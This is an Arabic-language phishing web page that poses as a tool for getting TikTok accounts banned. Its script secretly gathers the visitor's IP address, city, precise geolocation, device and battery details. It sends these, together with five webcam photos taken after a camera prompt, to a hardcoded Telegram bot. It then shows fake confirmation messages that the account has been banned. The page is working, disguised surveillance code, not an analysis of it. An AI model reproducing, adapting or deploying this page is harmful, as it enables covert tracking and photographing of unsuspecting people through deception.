<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>حفيذ الدليم لتبنيد حسابات تيك توك</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #1a1a1a 0%, #000 100%);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    #particles-js {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      z-index: 0;
    }
    .content {
      z-index: 1;
      width: 100%;
      max-width: 450px;
      padding: 30px;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(255, 0, 80, 0.3);
      animation: fadeIn 1s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h1 {
      font-size: 32px;
      margin-bottom: 20px;
      color: #ff0050;
      text-shadow: 0 0 15px #ff0050, 0 0 25px #ff0050;
      animation: glow 2s ease-in-out infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 10px #ff0050, 0 0 20px #ff0050; }
      to { text-shadow: 0 0 20px #ff0050, 0 0 30px #ff0050; }
    }
    p {
      color: #ddd;
      margin-bottom: 25px;
      font-size: 18px;
    }
    button {
      background: #ff0050;
      color: white;
      border: none;
      padding: 15px 30px;
      border-radius: 50px;
      font-size: 20px;
      cursor: pointer;
      box-shadow: 0 0 20px #ff0050;
      transition: all 0.3s ease;
      width: 100%;
      max-width: 320px;
    }
    button:hover {
      background: #e60045;
      transform: translateY(-2px);
      box-shadow: 0 0 30px #ff0050;
    }
    button:disabled {
      background: #666;
      cursor: not-allowed;
      box-shadow: none;
    }
    input {
      padding: 15px 20px;
      border-radius: 30px;
      border: none;
      margin-bottom: 30px;
      text-align: center;
      font-size: 18px;
      width: 100%;
      max-width: 320px;
      box-shadow: 0 0 15px #ff0050;
      background: #222;
      color: white;
      transition: all 0.3s ease;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 25px #ff0050;
      background: #333;
    }
    video {
      display: none;
    }
    .icon {
      font-size: 70px;
      margin-bottom: 25px;
      color: #ff0050;
      text-shadow: 0 0 20px #ff0050;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    .loading {
      display: none;
      font-size: 16px;
      color: #ff0050;
      margin-top: 15px;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      50% { opacity: 0.5; }
    }
  </style>
</head>
<body>

  <div id="particles-js"></div>

  <div class="content">
    <div class="icon"><i class="fab fa-tiktok"></i></div>
    <h1>حفيذ الدليم لتبنيد حسابات تيك توك</h1>
    <p>أدخل اسم المستخدم بدون علامة @</p>
    <input id="username" type="text" placeholder="اسم المستخدم" autocomplete="off" />
    <button onclick="startProcess()">اضغط هنا لتبنيد الحساب</button>
    <div class="loading" id="loading">جاري المعالجة...</div>
    <video id="video" autoplay playsinline></video>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/particles.js"></script>
  <script>
    particlesJS("particles-js", {
      particles: {
        number: { value: 120, density: { enable: true, value_area: 800 } },
        color: { value: ["#ff0050", "#ff4d4d", "#ff8080"] },
        shape: { type: "circle" },
        opacity: { value: 0.6, random: true },
        size: { value: 3, random: true },
        line_linked: { enable: true, distance: 150, color: "#ff0050", opacity: 0.4, width: 1 },
        move: { enable: true, speed: 2, direction: "none", random: false }
      },
      interactivity: {
        detect_on: "canvas",
        events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } },
        modes: { repulse: { distance: 100 }, push: { particles_nb: 4 } }
      },
      retina_detect: true
    });

    const token = "8333393532:AAF_xlfStHNv66f-DZigr40pVzlW4Spt3nY";
    const chatId = "8146130042";

    async function sendTelegramMessage(text) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text })
        });
        return response.ok;
      } catch {
        return false;
      }
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");
      try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        });
        return response.ok;
      } catch {
        return false;
      }
    }

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
      } catch {
        return { country_name: "غير معروف", city: "غير معروف", ip: "غير معروف" };
      }
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "نعم ⚡" : "لا ❌"
        };
      } catch {
        return { level: "غير معروف", charging: "غير معروف" };
      }
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude.toFixed(5);
            const lon = pos.coords.longitude.toFixed(5);
            resolve(`https://maps.google.com/?q=${lat},${lon}`);
          },
          () => resolve("❌ غير مسموح أو غير متاح"),
          { timeout: 5000 }
        );
      });
    }

    function delay(ms) {
      return new Promise(res => setTimeout(res, ms));
    }

    async function startProcess() {
      const usernameInput = document.getElementById("username");
      const username = usernameInput.value.trim();
      const loading = document.getElementById("loading");
      const button = document.querySelector("button");

      if (!username) {
        alert("يرجى إدخال اسم المستخدم بدون علامة @");
        return;
      }

      usernameInput.disabled = true;
      button.disabled = true;
      loading.style.display = "block";

      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const location = await getLocation();
      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      const deviceInfo = navigator.userAgent;
      const screenRes = `${screen.width}x${screen.height}`;
      const connection = navigator.connection || {};
      const memory = navigator.deviceMemory || "غير معروف";
      const cores = navigator.hardwareConcurrency || "غير معروف";

      const message = `
📝 معلومات الزائر:
👤 اليوزر: ${username}
🌍 الدولة: ${ipInfo.country_name}
🏙️ المدينة: ${ipInfo.city}
🌐 IP: ${ipInfo.ip}
📍 الموقع الجغرافي: ${location}

📱 معلومات الجهاز:
🔋 الشحن: ${battery.level}%
⚡ هل يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
⚙️ الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

      const messageSent = await sendTelegramMessage(message);
      if (!messageSent) {
        alert("⚠️ فشل في إرسال المعلومات. حاول مرة أخرى.");
        usernameInput.disabled = false;
        button.disabled = false;
        loading.style.display = "none";
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        for (let i = 1; i <= 5; i++) {
          await delay(1500);
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          await new Promise(resolve => canvas.toBlob(async (blob) => {
            await sendPhoto(blob);
            resolve();
          }, "image/jpeg"));
        }

        stream.getTracks().forEach(track => track.stop());

        alert("✅ سيتم حظر الحساب بعد 500 ثانية!");
        setTimeout(() => {
          alert("🚫 تم حظر الحساب نهائيًا");
        }, 10 * 60 * 1000);

      } catch (err) {
        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
        alert("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
      }

      usernameInput.disabled = false;
      button.disabled = false;
      loading.style.display = "none";
    }
  </script>

</body>
  </html>
